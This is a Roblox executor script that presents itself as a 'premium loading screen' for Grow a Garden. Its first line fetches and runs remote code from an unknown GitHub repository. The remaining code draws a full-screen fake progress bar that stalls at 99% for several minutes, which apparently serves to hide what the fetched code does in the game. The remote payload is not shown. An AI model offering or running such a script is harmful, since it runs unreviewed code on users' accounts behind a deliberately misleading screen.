loadstring(game:HttpGet("https://raw.githubusercontent.com/arkoarko43/gagss/refs/heads/main/growagarden"))()


-- CHINOK - Premium Loading Screen GUI
-- Fixed for Delta & All Executors

local success, result = pcall(function()
    -- Services
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")

    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")

    -- Remove existing GUI if present
    if playerGui:FindFirstChild("ChinokLoading") then
        playerGui.ChinokLoading:Destroy()
    end

    -- Create ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ChinokLoading"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui

    -- Main Frame
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(85, 170, 85)
    mainFrame.BorderSizePixel = 0
    mainFrame.ZIndex = 1
    mainFrame.Parent = screenGui

    -- Background Gradient
    local backgroundGradient = Instance.new("UIGradient")
    backgroundGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(76, 175, 80)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(139, 195, 74)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(205, 220, 57))
    }
    backgroundGradient.Rotation = 45
    backgroundGradient.Parent = mainFrame

    -- Plants Container
    local plantsContainer = Instance.new("Frame")
    plantsContainer.Name = "PlantsContainer"
    plantsContainer.Size = UDim2.new(1, 0, 1, 0)
    plantsContainer.BackgroundTransparency = 1
    plantsContainer.ZIndex = 2
    plantsContainer.Parent = mainFrame

    -- Plant particles
    local plantEmojis = {"🌱", "🌿", "🍃", "🌸", "🌺", "🌻", "🌷", "🌹", "🌼", "🪴"}
    local plants = {}

    for i = 1, 12 do
        local plant = Instance.new("TextLabel")
        plant.Name = "Plant" .. i
        plant.Size = UDim2.new(0, 40, 0, 40)
        plant.Position = UDim2.new(math.random(0, 90)/100, 0, math.random(5, 90)/100, 0)
        plant.BackgroundTransparency = 1
        plant.Text = plantEmojis[math.random(1, #plantEmojis)]
        plant.TextScaled = true
        plant.TextTransparency = 0.4
        plant.TextColor3 = Color3.fromRGB(255, 255, 255)
        plant.ZIndex = 2
        plant.Parent = plantsContainer
        
        table.insert(plants, plant)
    end

    -- Content Frame
    local contentFrame = Instance.new("Frame")
    contentFrame.Name = "ContentFrame"
    contentFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
    contentFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    contentFrame.BackgroundTransparency = 1
    contentFrame.ZIndex = 10
    contentFrame.Parent = mainFrame

    -- Title
    local gameTitle = Instance.new("TextLabel")
    gameTitle.Name = "GameTitle"
    gameTitle.Size = UDim2.new(1, 0, 0.3, 0)
    gameTitle.Position = UDim2.new(0, 0, 0, 0)
    gameTitle.BackgroundTransparency = 1
    gameTitle.Text = "🌱 CHINOK 🌱"
    gameTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    gameTitle.TextScaled = true
    gameTitle.Font = Enum.Font.GothamBold
    gameTitle.TextStrokeTransparency = 0
    gameTitle.TextStrokeColor3 = Color3.fromRGB(0, 100, 0)
    gameTitle.ZIndex = 11
    gameTitle.Parent = contentFrame

    -- Loading Container
    local loadingContainer = Instance.new("Frame")
    loadingContainer.Name = "LoadingContainer"
    loadingContainer.Size = UDim2.new(1, 0, 0.4, 0)
    loadingContainer.Position = UDim2.new(0, 0, 0.4, 0)
    loadingContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    loadingContainer.BackgroundTransparency = 0.8
    loadingContainer.ZIndex = 10
    loadingContainer.Parent = contentFrame

    -- Loading Container Corner
    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 15)
    containerCorner.Parent = loadingContainer

    -- Status Text
    local statusText = Instance.new("TextLabel")
    statusText.Name = "StatusText"
    statusText.Size = UDim2.new(1, -20, 0.25, 0)
    statusText.Position = UDim2.new(0, 10, 0.1, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "🌱 Planting seeds..."
    statusText.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusText.TextScaled = true
    statusText.Font = Enum.Font.Gotham
    statusText.TextStrokeTransparency = 0.5
    statusText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    statusText.ZIndex = 11
    statusText.Parent = loadingContainer

    -- Loading Bar Background
    local loadingBarBg = Instance.new("Frame")
    loadingBarBg.Name = "LoadingBarBg"
    loadingBarBg.Size = UDim2.new(1, -40, 0.15, 0)
    loadingBarBg.Position = UDim2.new(0, 20, 0.45, 0)
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    loadingBarBg.BackgroundTransparency = 0.6
    loadingBarBg.BorderSizePixel = 0
    loadingBarBg.ZIndex = 10
    loadingBarBg.Parent = loadingContainer

    -- Loading Bar Background Corner
    local bgCorner = Instance.new("UICorner")
    bgCorner.CornerRadius = UDim.new(0, 20)
    bgCorner.Parent = loadingBarBg

    -- Loading Bar
    local loadingBar = Instance.new("Frame")
    loadingBar.Name = "LoadingBar"
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
    loadingBar.BorderSizePixel = 0
    loadingBar.ZIndex = 11
    loadingBar.Parent = loadingBarBg

    -- Loading Bar Corner
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 20)
    barCorner.Parent = loadingBar

    -- Loading Bar Gradient
    local barGradient = Instance.new("UIGradient")
    barGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(34, 139, 34)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50, 205, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(124, 252, 0))
    }
    barGradient.Parent = loadingBar

    -- Progress Text
    local progressText = Instance.new("TextLabel")
    progressText.Name = "ProgressText"
    progressText.Size = UDim2.new(1, -20, 0.2, 0)
    progressText.Position = UDim2.new(0, 10, 0.7, 0)
    progressText.BackgroundTransparency = 1
    progressText.Text = "0%"
    progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
    progressText.TextScaled = true
    progressText.Font = Enum.Font.GothamBold
    progressText.TextStrokeTransparency = 0.5
    progressText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    progressText.ZIndex = 11
    progressText.Parent = loadingContainer

    -- Mobile check
    local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
    if isMobile then
        contentFrame.Size = UDim2.new(0.95, 0, 0.7, 0)
        contentFrame.Position = UDim2.new(0.025, 0, 0.15, 0)
    end

    -- Loading variables
    local progress = 0
    local startTime = tick()
    local loadingMessages = {
        "🌱 Planting seeds...",
        "🌿 Watering the garden...",
        "🌸 Growing beautiful flowers...",
        "🦋 Attracting butterflies...",
        "🌻 Blooming sunflowers...",
        "🌺 Creating paradise...",
        "🌈 Adding final touches...",
        "✨ Almost ready...",
        "🌿 Almost there... just a bit more!"
    }

    -- Animation connections
    local connections = {}

    -- Plant animations
    for i, plant in pairs(plants) do
        local floatTween = TweenService:Create(plant, 
            TweenInfo.new(math.random(4, 8), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
            {Position = UDim2.new(plant.Position.X.Scale, 0, math.max(0.05, math.min(0.9, plant.Position.Y.Scale + math.random(-15, 15)/100)), 0)}
        )
        floatTween:Play()
        
        local rotateTween = TweenService:Create(plant,
            TweenInfo.new(math.random(6, 12), Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
            {Rotation = 360}
        )
        rotateTween:Play()
    end

    -- Title pulse
    local titlePulse = TweenService:Create(gameTitle,
        TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {TextTransparency = 0.3}
    )
    titlePulse:Play()

    -- Progress update function
    local function updateProgress()
        local elapsedTime = tick() - startTime
        local targetProgress = math.min((elapsedTime / 300) * 99, 99) -- 5 minutes to 99%
        
        progress = progress + (targetProgress - progress) * 0.03
        
        local progressPercent = math.floor(progress)
        progressText.Text = progressPercent .. "%"
        
        -- Update loading bar
        local barTween = TweenService:Create(loadingBar, 
            TweenInfo.new(0.5, Enum.EasingStyle.Quad), 
            {Size = UDim2.new(progress/100, 0, 1, 0)}
        )
        barTween:Play()
        
        -- Update status message
        local messageIndex = math.min(math.floor(progress/12.5) + 1, #loadingMessages)
        if progress >= 99 then
            messageIndex = #loadingMessages
        end
        
        if statusText.Text ~= loadingMessages[messageIndex] then
            statusText.Text = loadingMessages[messageIndex]
        end
        
        -- Stuck at 99% effect
        if progress >= 99 then
            progress = 99
            if not loadingBar:GetAttribute("Pulsing") then
                loadingBar:SetAttribute("Pulsing", true)
                local pulseTween = TweenService:Create(loadingBar,
                    TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
                    {BackgroundTransparency = 0.4}
                )
                pulseTween:Play()
            end
        end
    end

    -- Start progress update
    local progressConnection = RunService.Heartbeat:Connect(updateProgress)
    table.insert(connections, progressConnection)

    -- Cleanup function
    local function cleanup()
        for _, connection in pairs(connections) do
            if connection then
                connection:Disconnect()
            end
        end
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    end

    -- Auto cleanup after 6 minutes
    spawn(function()
        wait(360)
        cleanup()
    end)

    print("✅ CHINOK Loading Screen Started Successfully!")
    return cleanup

end)

if not success then
    warn("❌ CHINOK Error: " .. tostring(result))
    print("🔧 Try running the script again or check executor compatibility")
end
